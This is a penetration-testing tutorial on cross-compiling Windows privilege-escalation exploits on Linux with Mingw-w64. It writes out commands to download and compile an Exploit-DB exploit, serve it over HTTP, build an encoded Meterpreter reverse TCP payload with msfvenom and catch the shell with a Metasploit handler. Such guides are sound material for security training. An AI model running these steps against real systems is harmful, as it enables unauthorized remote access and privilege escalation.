# Compiling Windows Exploits on Linux

The vast majority of systems both enterprise and personal use Windows (workstations and servers). Conversely, most penetration testers work with Linux, such as Kali, Parrot OS, Pentoo, or Backbox. As such, it's imperative to be able to compile executable Windows exploits on our machine, without the need for a complete Windows dev environment. 

Through this topic, we will describe how to cross-compile Windows exploits on Linux using a Windows privilege escalate exploit. 
A popular tool to do so, is called Mingw-w64 (Minimalist GNU for Windows). 
Mingw-w64 is a free and open source development environment for creating windows applications. 

### Installing Mingw-w64

https://mingw-w64.org
http://www.mingw.org

```bash
sudo apt-get update
sudo apt-get install mingw-w64

# If Unable to locate package, update /etc/apt/sources.list
# Correct repos - https://www.kali.org/docs/general-use/kali-linux-sources-list-repositories/
```

### Compiling Windows Exploits

The first step is to download the exploit. 
Then, we can compile it:

```bash
# Download the privilege escalation exploit
wget https://www.exploit-db.com/download/40564 -O 40564.c

# Compile it
i686-w64-mingw32-gcc 40564.c -o exploit.exe -lws2_32
```

The `-lws2_32` is for naming the libraries/dlls you wish to link. 
In this case, we are link the 32-bit winsock dll (ws2_32).

### Transferring the exploit

To transfer to the target host where it can be executed, we can serve it with the built-in Apache Web Server, or even a simple Python SimpleHTTPServer:
```bash
sudo python -m SimpleHTTPServer 80
```

### Compilation Errors

Stack Overflow? 

### Exploiting from a Meterpreter Shell

We've seen how to transfer using Apache2 or Python, but what about using a reverse shell via Meterpreter?
First we generate a Windows 32-bit Meterpreter reverse TCP payload using Msfvenom, then execute it on the target host and receive the reverse shell on the attack box, using the multi-handler module in metasploit.

```
Real world, we'd exploit a vulnerability first to allow us to upload files to the target host and execute them. For this demonstrattion, we are assuming we already have command execution on the target to allow for file upload and execution.
```

Creating the Meterpreter reverse shell payload with Msfvenom:
```bash
msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp LHOST=[IP attack box] LPORT=4444 -e x86/shikata_ga_nai -f exe -o exploit.exe
```

With the exploit ready, we need to setup a handler to receive the shell:
```bash
1 - msfconsole
2 - use exploit/multi/handler
3 - set lhost [IP attackbox]
4 - set lport 4444
5 - run
```

Lastly, we can download the exploit and run it to receive the reverse shell on msfconsole. 

```bash
1 - shell # To spawn the reverse shell from meterpreter
2 - whoami # To validate our current logged in user
3 - exploit.exe # To execute our privilege escalation payload
4 - whoami # To validate our permissions were elevated
```

